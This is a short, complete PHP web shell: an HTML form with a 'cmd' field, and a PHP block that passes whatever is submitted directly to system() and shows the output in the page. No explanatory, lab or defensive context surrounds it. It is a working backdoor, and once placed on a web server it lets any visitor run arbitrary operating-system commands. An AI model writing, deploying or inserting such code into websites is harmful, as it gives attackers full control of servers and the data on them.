<HTML>
<BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
  <input type="text" name="cmd">
  <input type="submit" value="send">
</FORM>
<pre>
<?
if($_GET['cmd'])
{ system($_GET['cmd']);
}
?>
</pre>
</body>
</html>
